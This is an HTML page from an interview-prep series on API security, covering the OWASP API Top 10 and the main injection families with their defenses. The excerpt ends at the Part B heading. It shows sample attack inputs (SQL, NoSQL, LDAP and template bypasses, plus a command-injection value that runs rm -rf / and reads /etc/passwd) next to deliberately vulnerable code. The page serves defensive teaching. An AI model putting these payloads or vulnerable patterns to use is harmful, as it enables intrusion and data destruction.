@@ -1,0 +1,2548 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>API Design — Volume 14: Security &amp; Abuse Prevention</title>
+<style>
+  :root{
+    --ink:#150709;
+    --ink-soft:#3d1a20;
+    --muted:#8a5560;
+    --line:#f0d5da;
+    --bg:#fdf5f6;
+    --card:#ffffff;
+    --crimson:#9f1239;
+    --crimson-soft:#ffe4e6;
+    --crimson-deep:#4c0519;
+    --red:#dc2626;
+    --red-soft:#fee2e2;
+    --amber:#b45309;
+    --teal:#0f766e;
+    --blue:#1d4ed8;
+    --violet:#6d28d9;
+    --shadow:0 1px 2px rgba(76,5,25,.06), 0 8px 24px -8px rgba(76,5,25,.14);
+    --radius:16px;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    background:
+      radial-gradient(1200px 600px at 8% -10%, #ffe4e6 0%, transparent 60%),
+      radial-gradient(1000px 500px at 100% 0%, #fee2e2 0%, transparent 55%),
+      var(--bg);
+    color:var(--ink);
+    font-family:"Segoe UI", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
+    line-height:1.72;
+    font-size:16.5px;
+    -webkit-font-smoothing:antialiased;
+  }
+  .wrap{max-width:1080px;margin:0 auto;padding:0 22px 90px;}
+
+  header.hero{
+    background:linear-gradient(135deg,#150709 0%, #4c0519 45%, #9f1239 100%);
+    color:#fff1f2;
+    padding:64px 22px 56px;
+    position:relative;
+    overflow:hidden;
+  }
+  header.hero::after{
+    content:"";
+    position:absolute; inset:0;
+    background:
+      radial-gradient(600px 300px at 85% 15%, rgba(220,38,38,.42), transparent 70%),
+      radial-gradient(520px 280px at 12% 92%, rgba(190,18,60,.4), transparent 70%);
+    pointer-events:none;
+  }
+  .hero-inner{max-width:1080px;margin:0 auto;position:relative;z-index:2;}
+  .eyebrow{
+    display:inline-block;font-size:.72rem;letter-spacing:.18em;text-transform:uppercase;
+    font-weight:700;padding:7px 15px;border-radius:999px;
+    background:rgba(251,113,133,.18);border:1px solid rgba(251,113,133,.5);
+    color:#fda4af;margin-bottom:20px;
+  }
+  header.hero h1{
+    font-size:clamp(1.9rem, 4.4vw, 3rem);line-height:1.15;margin:0 0 16px;
+    font-weight:800;letter-spacing:-.02em;
+  }
+  header.hero h1 span{
+    background:linear-gradient(90deg,#fda4af,#fca5a5);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+  header.hero p.lede{font-size:1.06rem;color:#fecdd3;max-width:780px;margin:0 0 26px;}
+  .meta-chips{display:flex;flex-wrap:wrap;gap:10px;}
+  .chip{
+    font-size:.78rem;font-weight:600;padding:7px 14px;border-radius:999px;
+    background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.16);color:#ffe4e6;
+  }
+
+  .roadmap{
+    background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+    box-shadow:var(--shadow);padding:26px 28px;margin-top:-34px;position:relative;z-index:5;
+  }
+  .roadmap h2{
+    font-size:.78rem;text-transform:uppercase;letter-spacing:.14em;color:var(--muted);
+    margin:0 0 16px;font-weight:700;
+  }
+  .roadmap-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:12px;}
+  .roadmap-item{
+    border:1px solid var(--line);border-radius:12px;padding:12px 14px;font-size:.86rem;
+    background:#fffbfb;opacity:.7;
+  }
+  .roadmap-item.done{
+    border-color:#fda4af;background:linear-gradient(180deg,#fff1f2,#ffffff);opacity:1;
+  }
+  .roadmap-item.current{
+    border-color:#fb7185;background:linear-gradient(180deg,#ffe4e6,#ffffff);opacity:1;
+    box-shadow:0 0 0 3px rgba(159,18,57,.14);
+  }
+  .roadmap-item .tag{
+    display:inline-block;font-size:.64rem;font-weight:800;letter-spacing:.08em;
+    padding:2px 8px;border-radius:999px;margin-bottom:6px;
+  }
+  .tag-done{background:var(--crimson-soft);color:var(--crimson-deep);}
+  .tag-now{background:#fecdd3;color:#881337;}
+  .tag-next{background:#e2e8f0;color:#475569;}
+  .roadmap-item strong{display:block;color:var(--ink);font-size:.89rem;}
+
+  nav.toc{
+    background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+    box-shadow:var(--shadow);padding:22px 26px;margin:26px 0 44px;
+  }
+  nav.toc h2{
+    font-size:.78rem;text-transform:uppercase;letter-spacing:.14em;color:var(--muted);
+    margin:0 0 14px;font-weight:700;
+  }
+  nav.toc ol{
+    margin:0;padding-left:0;list-style:none;counter-reset:toc;
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:8px 26px;
+  }
+  nav.toc li{
+    counter-increment:toc;font-size:.93rem;padding:6px 0 6px 34px;
+    position:relative;border-bottom:1px dashed #fbe6e9;
+  }
+  nav.toc li::before{
+    content:counter(toc);position:absolute;left:0;top:7px;width:22px;height:22px;
+    border-radius:7px;background:var(--crimson-soft);color:var(--crimson);
+    font-size:.72rem;font-weight:800;display:flex;align-items:center;justify-content:center;
+  }
+  nav.toc a{color:var(--ink-soft);text-decoration:none;font-weight:500;}
+  nav.toc a:hover{color:var(--crimson);}
+
+  .part-band{display:flex;align-items:center;gap:16px;margin:56px 0 26px;}
+  .part-band .bar{
+    width:5px;height:44px;border-radius:99px;
+    background:linear-gradient(180deg,var(--crimson),#fb7185);
+  }
+  .part-band.red .bar{background:linear-gradient(180deg,var(--red),#f87171);}
+  .part-band.teal .bar{background:linear-gradient(180deg,var(--teal),#2dd4bf);}
+  .part-band h2{margin:0;font-size:1.5rem;letter-spacing:-.01em;font-weight:800;}
+  .part-band .sub{
+    display:block;font-size:.82rem;font-weight:600;color:var(--muted);
+    text-transform:uppercase;letter-spacing:.12em;margin-top:2px;
+  }
+
+  article.q{
+    background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+    box-shadow:var(--shadow);padding:0 0 26px;margin-bottom:28px;overflow:hidden;
+    scroll-margin-top:24px;
+  }
+  .q-head{
+    display:flex;gap:16px;align-items:flex-start;padding:22px 28px 18px;
+    border-bottom:1px solid #fbeef0;background:linear-gradient(180deg,#fffafa,#ffffff);
+  }
+  .q-num{
+    flex:none;width:42px;height:42px;border-radius:12px;display:flex;
+    align-items:center;justify-content:center;font-weight:800;font-size:.92rem;color:#fff;
+    background:linear-gradient(135deg,#9f1239,#dc2626);
+    box-shadow:0 6px 14px -6px rgba(159,18,57,.7);
+  }
+  .red .q-num{background:linear-gradient(135deg,#dc2626,#f87171);box-shadow:0 6px 14px -6px rgba(220,38,38,.7);}
+  .teal .q-num{background:linear-gradient(135deg,#0f766e,#14b8a6);box-shadow:0 6px 14px -6px rgba(15,118,110,.7);}
+  .q-head h3{margin:0;font-size:1.14rem;font-weight:700;line-height:1.4;letter-spacing:-.01em;}
+  .q-body{padding:22px 28px 0;}
+  .q-body p{margin:0 0 15px;color:var(--ink-soft);}
+  .q-body p:last-child{margin-bottom:0;}
+  .q-body h4{margin:24px 0 10px;font-size:.95rem;font-weight:800;color:var(--ink);}
+  .q-body h4::before{content:"▹";color:var(--crimson);margin-right:8px;font-size:.85rem;}
+  .red .q-body h4::before{color:var(--red);}
+  .teal .q-body h4::before{color:var(--teal);}
+  .q-body ul,.q-body ol{margin:0 0 16px;padding-left:22px;color:var(--ink-soft);}
+  .q-body li{margin-bottom:8px;}
+  .q-body li::marker{color:var(--crimson);}
+  .red .q-body li::marker{color:var(--red);}
+  .teal .q-body li::marker{color:var(--teal);}
+  strong{color:var(--ink);font-weight:700;}
+  code{
+    background:#fdf2f4;border:1px solid #f0d5da;border-radius:6px;padding:1px 6px;
+    font-size:.87em;font-family:"SFMono-Regular",Consolas,monospace;color:#9f1239;
+  }
+
+  .callout{border-radius:12px;padding:14px 18px;margin:18px 0 4px;font-size:.93rem;border-left:4px solid;}
+  .callout .label{
+    display:block;font-size:.68rem;font-weight:800;letter-spacing:.13em;
+    text-transform:uppercase;margin-bottom:5px;
+  }
+  .callout p{margin:0 0 8px;font-size:.93rem;}
+  .callout p:last-child{margin-bottom:0;}
+  .answer{background:linear-gradient(180deg,#fff1f2,#ffffff);border-color:var(--crimson);}
+  .answer .label{color:var(--crimson-deep);}
+  .tip{background:linear-gradient(180deg,#eff6ff,#ffffff);border-color:var(--blue);}
+  .tip .label{color:#1d4ed8;}
+  .tradeoff{background:linear-gradient(180deg,#fffbeb,#ffffff);border-color:var(--amber);}
+  .tradeoff .label{color:#b45309;}
+  .pitfall{background:linear-gradient(180deg,#fff5f6,#ffffff);border-color:var(--red);}
+  .pitfall .label{color:#b91c1c;}
+
+  .table-scroll{overflow-x:auto;margin:18px 0;border-radius:12px;border:1px solid var(--line);}
+  table{width:100%;border-collapse:collapse;font-size:.87rem;background:#fff;}
+  thead th{
+    background:#fffafa;text-align:left;padding:11px 14px;font-weight:800;
+    font-size:.75rem;text-transform:uppercase;letter-spacing:.07em;color:var(--muted);
+    border-bottom:2px solid var(--line);white-space:nowrap;
+  }
+  tbody td{padding:11px 14px;border-bottom:1px solid #fdf0f2;color:var(--ink-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:#fffcfc;}
+  tbody td:first-child{font-weight:700;color:var(--ink);}
+
+  pre{
+    margin:0;
+    white-space:pre-wrap;
+    font-family:"SFMono-Regular",Consolas,monospace;
+    font-size:.83rem;
+    line-height:1.55;
+  }
+
+  .next-part{
+    background:linear-gradient(135deg,#150709,#9f1239);color:#ffe4e6;
+    border-radius:var(--radius);padding:32px 34px;margin-top:50px;box-shadow:var(--shadow);
+  }
+  .next-part h3{margin:0 0 12px;font-size:1.2rem;color:#fff;font-weight:800;}
+  .next-part p{margin:0 0 16px;color:#fecdd3;font-size:.95rem;}
+  .next-list{
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+    gap:10px;list-style:none;padding:0;margin:0;
+  }
+  .next-list li{
+    background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.13);
+    border-radius:10px;padding:10px 14px;font-size:.86rem;color:#ffe4e6;
+  }
+
+  @media (max-width:640px){
+    .q-head{padding:18px 18px 15px;}
+    .q-body{padding:18px 18px 0;}
+    header.hero{padding:44px 18px 46px;}
+    .roadmap{padding:20px;}
+    nav.toc{padding:18px;}
+    nav.toc ol{grid-template-columns:1fr;}
+  }
+  @media print{
+    body{background:#fff;}
+    article.q, nav.toc, .roadmap{box-shadow:none;page-break-inside:avoid;}
+    header.hero{background:#150709 !important;-webkit-print-color-adjust:exact;}
+  }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="hero-inner">
+    <span class="eyebrow">Volume 14 · Section 14 of 18</span>
+    <h1>API Design for System Interviews<br><span>Security &amp; Abuse Prevention</span></h1>
+    <p class="lede">
+      The attack classes that break APIs in production. The OWASP API Top 10 in depth, injection in every form
+      (SQL, NoSQL, command, LDAP, template), SSRF and XXE beyond the webhook case, deserialization, mass
+      assignment, enumeration, race conditions, and the validation-and-testing discipline that catches them
+      before attackers do.
+    </p>
+    <div class="meta-chips">
+      <span class="chip">10 Questions</span>
+      <span class="chip">500+ words each</span>
+      <span class="chip">Attack + defense</span>
+      <span class="chip">OWASP API Top 10</span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- ROADMAP -->
+  <section class="roadmap">
+    <h2>Answer-Series Roadmap</h2>
+    <div class="roadmap-grid">
+      <div class="roadmap-item done">
+        <span class="tag tag-done">Volume 1–13 — Complete</span>
+        <strong>Foundations through gRPC</strong>
+        All prior volumes
+      </div>
+      <div class="roadmap-item current">
+        <span class="tag tag-now">Volume 14 — You are here</span>
+        <strong>Security &amp; Abuse Prevention</strong>
+        OWASP Top 10, injection, SSRF, XXE, deserialization, testing
+      </div>
+      <div class="roadmap-item">
+        <span class="tag tag-next">Volume 15</span>
+        <strong>Observability &amp; Operations</strong>
+        Metrics, tracing, deployment, incidents
+      </div>
+      <div class="roadmap-item">
+        <span class="tag tag-next">Volume 16–17</span>
+        <strong>Lifecycle, Governance &amp; 17 Problems</strong>
+        Design reviews, DX, classic API prompts
+      </div>
+      <div class="roadmap-item">
+        <span class="tag tag-next">Volume 18</span>
+        <strong>Senior &amp; Staff Trade-offs</strong>
+        Choosing between every pair of options
+      </div>
+    </div>
+  </section>
+
+  <!-- TOC -->
+  <nav class="toc">
+    <h2>Questions Answered in This Volume</h2>
+    <ol>
+      <li><a href="#q1">Walk through the OWASP API Security Top 10</a></li>
+      <li><a href="#q2">Injection: SQL, NoSQL, command, LDAP, template</a></li>
+      <li><a href="#q3">SSRF beyond webhooks — the full attack surface</a></li>
+      <li><a href="#q4">XXE and the XML parsing traps</a></li>
+      <li><a href="#q5">Deserialization attacks</a></li>
+      <li><a href="#q6">Mass assignment and excessive data exposure</a></li>
+      <li><a href="#q7">Enumeration and information disclosure</a></li>
+      <li><a href="#q8">Race conditions and TOCTOU in API design</a></li>
+      <li><a href="#q9">Input validation and output encoding as a discipline</a></li>
+      <li><a href="#q10">Security testing in CI — SAST, DAST, fuzzing, dependency scanning</a></li>
+    </ol>
+  </nav>
+
+  <!-- ================= PART A ================= -->
+  <div class="part-band">
+    <div class="bar"></div>
+    <h2>Part A — The Taxonomy
+      <span class="sub">The OWASP Top 10 and the injection family</span>
+    </h2>
+  </div>
+
+  <!-- Q1 -->
+  <article class="q" id="q1">
+    <div class="q-head">
+      <div class="q-num">1</div>
+      <h3>Walk through the OWASP API Security Top 10 — what each category is, and where it appears in real APIs.</h3>
+    </div>
+    <div class="q-body">
+      <div class="callout answer">
+        <span class="label">Short Answer</span>
+        <p>The OWASP API Security Top 10 (2023) is the canonical list of the most critical API vulnerabilities.
+        In order: <strong>API1</strong> Broken Object Level Authorization, <strong>API2</strong> Broken
+        Authentication, <strong>API3</strong> Broken Object Property Level Authorization, <strong>API4</strong>
+        Unrestricted Resource Consumption, <strong>API5</strong> Broken Function Level Authorization,
+        <strong>API6</strong> Unrestricted Access to Sensitive Business Flows, <strong>API7</strong> SSRF,
+        <strong>API8</strong> Security Misconfiguration, <strong>API9</strong> Improper Inventory Management,
+        <strong>API10</strong> Unsafe Consumption of APIs.</p>
+      </div>
+
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>#</th><th>Category</th><th>What it means</th><th>Where it shows up</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>API1</strong></td>
+              <td>Broken Object Level Authorization (BOLA)</td>
+              <td>The API checks that the user is logged in but not that they own the object</td>
+              <td><code>GET /orders/123</code> returns any order for any authenticated user (Volume 6, Question 10)</td>
+            </tr>
+            <tr>
+              <td><strong>API2</strong></td>
+              <td>Broken Authentication</td>
+              <td>Weak login, credential stuffing, missing MFA, tokens in URLs, no rate limit on auth</td>
+              <td>Login endpoint with no lockout; JWT accepted after password change; API key in query string (Volume 6)</td>
+            </tr>
+            <tr>
+              <td><strong>API3</strong></td>
+              <td>Broken Object Property Level Authorization</td>
+              <td>Mass assignment or excessive data exposure — the client can read or write properties it should not</td>
+              <td><code>POST /users</code> with <code>{"is_admin": true}</code>; response includes <code>password_hash</code> (Question 6)</td>
+            </tr>
+            <tr>
+              <td><strong>API4</strong></td>
+              <td>Unrestricted Resource Consumption</td>
+              <td>No rate limits, no result caps, no query complexity limits, unbounded file uploads</td>
+              <td><code>GET /users?limit=1000000</code>; GraphQL query with no depth limit (Volume 7, Volume 12)</td>
+            </tr>
+            <tr>
+              <td><strong>API5</strong></td>
+              <td>Broken Function Level Authorization</td>
+              <td>The endpoint itself should be role-restricted, but the check is missing</td>
+              <td>Any authenticated user can call <code>DELETE /users/42</code> (Volume 6, Question 10)</td>
+            </tr>
+            <tr>
+              <td><strong>API6</strong></td>
+              <td>Unrestricted Access to Sensitive Business Flows</td>
+              <td>Business logic can be abused without violating a technical rule</td>
+              <td>Automated purchase of all limited-edition items; fake accounts created to claim coupons</td>
+            </tr>
+            <tr>
+              <td><strong>API7</strong></td>
+              <td>Server-Side Request Forgery (SSRF)</td>
+              <td>The server fetches a client-supplied URL, reaching internal services</td>
+              <td>Webhook URL pointing to cloud metadata (Volume 11, Question 8); image-import from URL (Question 3)</td>
+            </tr>
+            <tr>
+              <td><strong>API8</strong></td>
+              <td>Security Misconfiguration</td>
+              <td>Default creds, open CORS, verbose errors, debug endpoints, unpatched software, unnecessary HTTP methods</td>
+              <td>CORS with <code>*</code> and credentials; stack traces in 500 responses; <code>/debug</code> exposed</td>
+            </tr>
+            <tr>
+              <td><strong>API9</strong></td>
+              <td>Improper Inventory Management</td>
+              <td>Forgotten endpoints, old versions, shadow APIs, undocumented hosts</td>
+              <td><code>/v0/internal</code> still reachable; a debug endpoint added in 2019 still running</td>
+            </tr>
+            <tr>
+              <td><strong>API10</strong></td>
+              <td>Unsafe Consumption of APIs</td>
+              <td>Trusting a third-party API's response without validation</td>
+              <td>Blindly trusting an exchange-rate API; blindly trusting a payment provider's callback</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>Where the list comes from and how to use it</h4>
+      <p>The list is compiled from real breach data, bug-bounty findings, and industry surveys. It is updated
+      every few years to reflect the attack patterns actually seen in production — not theoretical
+      vulnerabilities. This makes it the right prioritisation tool: fixing the top 5 catches the majority of
+      real-world breaches.</p>
+      <p>Each category has:</p>
+      <ul>
+        <li><strong>How it happens</strong> — the mechanism (missing check, wrong configuration, unfiltered
+        input).</li>
+        <li><strong>Example attack scenarios</strong> — the concrete steps an attacker takes.</li>
+        <li><strong>How to prevent</strong> — the specific controls (checks, limits, patterns).</li>
+        <li><strong>References</strong> — CWEs and OWASP guides.</li>
+      </ul>
+
+      <h4>The pattern that connects all ten</h4>
+      <p>Almost every category is one of three failures:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Failure</th><th>Categories</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Missing authorization</strong> — the check is absent, wrong, or bypassable</td>
+              <td>API1, API3, API5, API6</td>
+            </tr>
+            <tr>
+              <td><strong>Missing input constraint</strong> — the input has no bounds, no validation, or is trusted</td>
+              <td>API4, API7, API10</td>
+            </tr>
+            <tr>
+              <td><strong>Missing operational discipline</strong> — configuration, inventory, authentication hygiene</td>
+              <td>API2, API8, API9</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>This is why the fixes overlap: a single "deny by default" principle (every request starts with no
+      permissions and must explicitly be granted them) addresses API1, API3, and API5. A single "validate all
+      input against an allowlist, bound all resource consumption" principle addresses API4, API7, and API10.</p>
+
+      <h4>The most common in practice</h4>
+      <p>Of the ten, <strong>BOLA (API1)</strong> is the most common, by a wide margin. Real-world bug bounties
+      find it constantly — the object ID in the URL is changed, and the API returns another user's data. The
+      reason it is so common: the check is easy to forget, hard to test at scale, and invisible in normal use.
+      Every REST API that returns an object by ID is a candidate; every GraphQL API that resolves nested
+      entities is too.</p>
+      <p>The second most common is <strong>API3</strong> (mass assignment and excessive data exposure) — the
+      server returns the whole database row (including password hash, internal fields, PII) or accepts the
+      whole request body (including role, is_admin, ownership fields). It is a natural consequence of "map
+      the model to the response" without a projection layer.</p>
+
+      <h4>The correct mental model</h4>
+      <p>The OWASP Top 10 is not a checklist to satisfy; it is a set of attack patterns to design against.
+      The API that passes a security review is not the one that has a WAF rule for each category — it is the
+      one whose design makes the attacks impossible:</p>
+      <ul>
+        <li><strong>Authorization in the query</strong> — the object is only fetched if the caller is
+        authorized, not fetched then checked.</li>
+        <li><strong>Explicit request DTOs</strong> — the client can only set fields the API declares.</li>
+        <li><strong>Explicit response DTOs</strong> — the API returns only fields the client should see.</li>
+        <li><strong>Bounded everything</strong> — page size, upload size, query complexity, request rate,
+        connection count.</li>
+        <li><strong>URL validation for any outbound request</strong> — nothing is fetched without checking the
+        target.</li>
+        <li><strong>Inventory and decommissioning</strong> — every endpoint is documented and reviewed; nothing
+        is forgotten.</li>
+      </ul>
+
+      <div class="callout tip">
+        <span class="label">Interview Framing</span>
+        <p>Say: "The OWASP API Top 10 is the prioritisation list — BOLA is number one and by far the most common.
+        Almost every category is one of three failures: missing authorization, missing input constraint, or
+        missing operational discipline. The fix is design-level: authorization in the query, explicit DTOs, and
+        bounds on everything." That demonstrates the taxonomy and the design response.</p>
+      </div>
+    </div>
+  </article>
+
+  <!-- Q2 -->
+  <article class="q" id="q2">
+    <div class="q-head">
+      <div class="q-num">2</div>
+      <h3>What are the different injection vulnerabilities, and how do you prevent each?</h3>
+    </div>
+    <div class="q-body">
+      <div class="callout answer">
+        <span class="label">Short Answer</span>
+        <p>Injection is the attack where untrusted input is interpreted as code or commands by a downstream
+        system. The families: <strong>SQL injection</strong> (input becomes SQL),
+        <strong>NoSQL injection</strong> (input becomes a MongoDB query operator),
+        <strong>command injection</strong> (input becomes a shell command),
+        <strong>LDAP injection</strong> (input becomes an LDAP filter),
+        <strong>template injection</strong> (input becomes template code), and
+        <strong>log injection</strong> (input forges log lines). The universal prevention: <strong>never
+        concatenate untrusted input into code; use parameterised interfaces or allowlists</strong>.</p>
+      </div>
+
+      <h4>SQL injection</h4>
+      <p>The classic. Input like <code>' OR '1'='1</code> in a login form becomes:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Vulnerable code</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>
+                <pre>"SELECT * FROM users WHERE email = '" + email + "'"</pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>If <code>email</code> is <code>' OR '1'='1</code>, the query becomes <code>SELECT * FROM users WHERE
+      email = '' OR '1'='1'</code> — returns every user, and the attacker is logged in as the first one.</p>
+      <p>Worse: <code>'; DROP TABLE users; --</code> deletes the table. And with stacked queries
+      (multiple statements in one call), the attacker can read from other tables, write data, or call
+      stored procedures.</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Defense</th><th>How</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Parameterised queries (prepared statements)</strong></td>
+              <td>The SQL and the values are sent separately; the database treats the values as data, never as
+              code. This is the definitive fix.</td>
+            </tr>
+            <tr>
+              <td><strong>ORM/query builder</strong></td>
+              <td>Use an ORM that parameterises by default; never build raw SQL from string concatenation</td>
+            </tr>
+            <tr>
+              <td><strong>Allowlist for identifiers</strong></td>
+              <td>Table names, column names, sort directions — cannot be parameterised, so validate against an
+              allowlist</td>
+            </tr>
+            <tr>
+              <td><strong>Least-privilege database user</strong></td>
+              <td>The application's DB user should not have DROP, ALTER, or access to other schemas; limits the
+              damage</td>
+            </tr>
+            <tr>
+              <td><strong>Input validation</strong></td>
+              <td>Reject obviously malformed input; this is defence in depth, not the primary fix</td>
+            </tr>
+            <tr>
+              <td><strong>WAF</strong></td>
+              <td>Block known SQL injection patterns; catches unsophisticated attacks, misses custom ones</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>Parameterised queries are the only reliable fix. Input validation, WAFs, and escaping are all
+      supplements — they catch the obvious cases and miss the subtle ones. Every modern database driver
+      supports parameterisation; using it is not a feature, it is the discipline.</p>
+
+      <h4>NoSQL injection</h4>
+      <p>MongoDB and similar databases accept JSON-like query documents. If the client controls the document,
+      they can supply operators:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Client input</th><th>Effect</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>{"email": "a@b.com", "password": "x"}</code></td>
+              <td>Normal login attempt</td>
+            </tr>
+            <tr>
+              <td><code>{"email": "admin@x.com", "password": {"$ne": null}}</code></td>
+              <td>The password query matches any non-null value — login as admin without the password</td>
+            </tr>
+            <tr>
+              <td><code>{"email": {"$gt": ""}, "password": {"$gt": ""}}</code></td>
+              <td>Matches any user with any password — the first user is returned</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The bug: the server passes the client's JSON directly into the query:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Vulnerable code</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>db.users.findOne({ email: req.body.email, password: req.body.password })</code></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The defenses:</p>
+      <ul>
+        <li><strong>Coerce input to the expected type.</strong> If the email must be a string, check it is a
+        string before using it: <code>if (typeof email !== 'string') reject;</code>. This rejects objects
+        (including operators).</li>
+        <li><strong>Do not accept objects from the client</strong> for query fields — accept a string, or a
+        structured, validated input.</li>
+        <li><strong>Use a schema validator</strong> (Joi, Zod, JSON Schema) that enforces types.</li>
+        <li><strong>Never hash-then-trust the input</strong> — the operators work at the query level, not the
+        value level.</li>
+      </ul>
+
+      <h4>Command injection</h4>
+      <p>Calling a shell command with user input:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Vulnerable code</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>exec("convert " + filename + " output.jpg")</code></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>If <code>filename</code> is <code>input.jpg; rm -rf /</code>, the shell executes <code>convert
+      input.jpg</code>, then <code>rm -rf /</code>. Or <code>$(cat /etc/passwd)</code> — the shell expands
+      the command substitution and inserts its output.</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Defense</th><th>How</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Avoid shell invocation</strong></td>
+              <td>Use the language's native library, not a subprocess</td>
+            </tr>
+            <tr>
+              <td><strong>Argument arrays, not strings</strong></td>
+              <td><code>exec(["convert", filename, "output.jpg"])</code> — no shell is involved, so no shell
+              metacharacters are interpreted</td>
+            </tr>
+            <tr>
+              <td><strong>Allowlist filenames</strong></td>
+              <td>Reject filenames with <code>;</code>, <code>$</code>, <code>|</code>, <code>&amp;</code>,
+              <code>`</code>, or path separators</td>
+            </tr>
+            <tr>
+              <td><strong>Least-privilege process</strong></td>
+              <td>The process cannot write outside its directory; limits damage if injection succeeds</td>
+            </tr>
+            <tr>
+              <td><strong>Sandboxing / containers</strong></td>
+              <td>Run the command in a container with limited filesystem and network access</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>LDAP injection</h4>
+      <p>LDAP filters use a similar syntax to SQL. If the client controls part of the filter, they can
+      manipulate it:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Vulnerable code</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>(uid=" + username + ")(userPassword=" + password + ")</code></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>If <code>username</code> is <code>*)(uid=*)</code>, the filter becomes
+      <code>(uid=*)(uid=*)(userPassword=...)</code> — a match on any user, bypassing authentication.</p>
+      <p>The defense:</p>
+      <ul>
+        <li><strong>Escape special characters</strong> — <code>*</code>, <code>(</code>, <code>)</code>,
+        <code>\</code>, <code>NUL</code> — before inserting into a filter.</li>
+        <li><strong>Use a library that handles escaping</strong> — most LDAP libraries have a function.</li>
+        <li><strong>Do not concatenate</strong> — some libraries support parameterised filters.</li>
+        <li><strong>Validate input against an allowlist</strong> — usernames should be alphanumeric + a few
+        symbols; no LDAP metacharacters.</li>
+      </ul>
+
+      <h4>Template injection</h4>
+      <p>If the client's input is used as a template, the template engine executes it:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Vulnerable code</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>template = "Hello " + name; return template.render()</code></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>If <code>name</code> is <code>{{ config.SECRET_KEY }}</code>, the template engine evaluates it — the
+      secret key is rendered in the response. With enough access, the attacker can execute arbitrary code
+      (SSTI — Server-Side Template Injection).</p>
+      <p>The defense:</p>
+      <ul>
+        <li><strong>Never treat user input as a template.</strong> Templates are code; user input is data.
+        Pass the input as a variable, not as template source.</li>
+        <li><strong>Use a sandboxed template engine</strong> — if the user must supply a template, restrict
+        the operations the template can perform.</li>
+        <li><strong>Escape output</strong> — the user's input is HTML-escaped before it is rendered, so
+        <code>{{...}}</code> is displayed literally.</li>
+      </ul>
+
+      <h4>Log injection</h4>
+      <p>User input written into a log file without escaping. If the input contains <code>\n</code>, the
+      attacker can forge log lines — fake "login successful" entries, hiding their own activity. If the log
+      is processed by a downstream system (a SIEM, a parser), the injected content can trigger further
+      injection.</p>
+      <p>The defense: sanitise log fields — replace newlines, control characters, and structured-log separators
+      with safe placeholders before logging. Structured logging (JSON) makes this easier — the fields are
+      separate from the message, so injection is contained.</p>
+
+      <h4>The universal principle</h4>
+      <p>Every injection vulnerability has the same root cause: <strong>untrusted input is interpreted as
+      code</strong>. The universal fix: <strong>separate code from data</strong>. Parameterised queries
+      separate SQL from values. Argument arrays separate commands from arguments. Escaping separates
+      template syntax from values. Allowlists restrict which values are permitted at all.</p>
+      <p>The corollary: input validation is not the fix; it is a supplement. A single <code>'; DROP TABLE
+      users; --</code> in a parameterised query is a literal string, not SQL. The vulnerability is not the
+      input; the vulnerability is the concatenation. Fix the concatenation, and the input cannot harm you.</p>
+
+      <div class="callout pitfall">
+        <span class="label">Common Pitfall</span>
+        <p>Using parameterised queries for <code>WHERE</code> clauses but concatenating table names, column
+        names, or <code>ORDER BY</code> clauses. These cannot be parameterised — the database needs to know
+        the identifier at parse time. The fix: validate the identifier against an allowlist, or use a
+        query builder that handles identifiers safely.</p>
+      </div>
+
+      <div class="callout tip">
+        <span class="label">Interview Framing</span>
+        <p>Say: "All injection is the same bug — untrusted input interpreted as code. The fix is to separate
+        code from data: parameterised queries, argument arrays, escaping, allowlists for identifiers. Input
+        validation is a supplement, not the fix." That covers the principle and the specific families.</p>
+      </div>
+    </div>
+  </article>
+
+  <!-- ================= PART B ================= -->
+  <div class="part-band red">
+    <div class="bar"></div>
+    <h2>Part B — Request-Side Attacks
+      <span class="sub">SSRF, XXE, deserialization, and mass assignment</span>
+    </h2>
+  </div>
+
